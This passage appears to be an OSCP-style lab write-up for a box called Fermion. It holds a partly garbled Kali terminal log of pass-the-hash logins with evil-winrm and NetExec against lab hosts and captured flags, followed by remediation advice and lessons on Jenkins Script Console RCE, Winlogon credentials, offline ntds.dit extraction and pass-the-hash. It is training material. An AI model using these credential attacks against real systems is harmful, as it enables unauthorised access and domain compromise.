kali@kali:~/Platforms/Offsec/Fermion [21:00:35] $ =nxc winrm 192.168.210.49 -u Administrator -H $NThash -d fermion.yzx -x 'whoami && hostname'nxc'whoami && hostname'>
kali@kali:~/Platforms/Offsec/Fermion [21:01:58] $ evil-winrm -i 192.168.210.49 -u Administrator -H $NThashevil-winrm>
$ [21:05:11] loot flag root 970a35bdec77a2f4f0e94556a6bda45c
$ [21:05:42] curl -s -u $Username:$Password \
kali@kali:~/Platforms/Offsec/Fermion [21:05:10] $ =loot flag root 970a35bdec77a2f4f0e94556a6bda45cloot>
[+] Flag saved:  root = 970a35bdec77a2f4f0e94556a6bda45c  →  loot/flags.txt
kali@kali:~/Platforms/Offsec/Fermion [21:05:11] $ =curl -s -u $Username:$Password \
<title>Error 401 Invalid password/token for user: liz</title>
<pre>    Invalid password/token for user: liz</pre></p><hr><a href="http://eclipse.org/jetty">Powered by Jetty:// 9.4.z-SNAPSHOT</a><hr/>
$ [21:11:50] evil-winrm -i 192.168.210.41 -u Administrator -H $NThash
kali@kali:~/Platforms/Offsec/Fermion [21:09:25] $ evil-winrm -i 192.168.210.41 -u Administrator -H $NThashevil-winrm>
$ [21:24:38] evil-winrm -i 192.168.210.34 -u Administrator -H $NThash
9m [21:23:50] $ =evil-winrm -i 192.168.210.34 -u Administrator -H $NThashevil-winrm>
$ [21:27:08] loot flag root d1de6459f9e92d91e43f7c30e9e72297
$ [21:27:41] evil-winrm -i 192.168.210.41 -u Administrator -H $NThash
  -hashes aad3b435b51404eeaad3b435b51404ee:$NThash \
$ [21:30:02] loot flag root b87d22753d9f5b7d0eec151b0b8b220b
$ [21:31:05] cat ~/loot/flag.txt
$ [21:31:15] cat /loot/flag.txt
$ [21:31:23] cat /loot/flags.txt
$ [21:31:30] cat loot/flags.txt
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Fermion | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- A multi-host scan should be done before choosing the first foothold. The port pattern mapped the lab roles quickly.
- Jenkins Script Console RCE is often cleaner than a dropped payload. Use a small Groovy process wrapper and capture stdout/stderr.
- Recent-item shortcuts may point to stale paths. Confirm the real directory from the filesystem before searching it.
- Search large logs with `Select-String`; do not print the entire file.
- On Windows, test SSH, WinRM, SMB, and RDP independently after recovering credentials. One management protocol may work when another does not.
- An exported scheduled-task XML must be correlated with the live scheduler. The XML and writable binary were real findings, but the task was absent here.
- `SeImpersonatePrivilege` is worth checking, but a failed Potato callback should not stop credential hunting.
- Winlogon `DefaultPassword` is a high-priority local credential source.
- A readable custom SMB share can expose the entire AD database. Parse `ntds.dit` offline with the matching SYSTEM hive.
- Pass-the-hash avoids unnecessary cracking when the target accepts NTLM authentication.
- Keep Impacket tooling version-aligned; global wrappers can silently import a different Python package than expected.

- Treat lab descriptions as hypotheses to verify, not as evidence that every advertised step is live.
- Use the smallest search that answers the question: one targeted log and one targeted registry key beat an unbounded recursive dump.
- Separate credential validation from shell acquisition. NetExec can prove access even when a particular interactive client is unreliable.
- For offline AD extraction, database plus SYSTEM hive is the essential pair; the surrounding files are supporting evidence.
- Keep flags and secrets in loot, but make the write-up reproducible with paths, commands, expected output shape, and failure handling.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] — another three-host AD chain with credential recovery and delegation
- [[OSCP/BOXES/WRITE UPS/AD/Blackfield|Blackfield]] — authenticated SMB, offline NTDS extraction, and pass-the-hash
- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] — Winlogon cleartext credentials leading to domain access
- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] — Tomcat Manager deployment and privileged Windows service context
- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] — credential recovery followed by Windows remote management

## External resources

- [Jenkins Script Console](https://www.jenkins.io/doc/book/managing/script-console/)
- [Microsoft: Winlogon registry values](https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-autologon)
- [Impacket](https://github.com/fortra/impacket)
- [NetExec](https://github.com/Pennyw0rth/NetExec)

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

Fermion is a useful enterprise-chain exercise because every step rewards disciplined evidence handling: identify roles from ports, convert application execution into credential discovery, validate credentials across management protocols, inspect custom SMB shares, parse AD material offline, and use pass-the-hash only after proving the account context. It also demonstrates an important reporting habit: document when the advertised vulnerability is present but the live trigger is missing, then follow the next verified path instead of inventing a successful exploitation step.
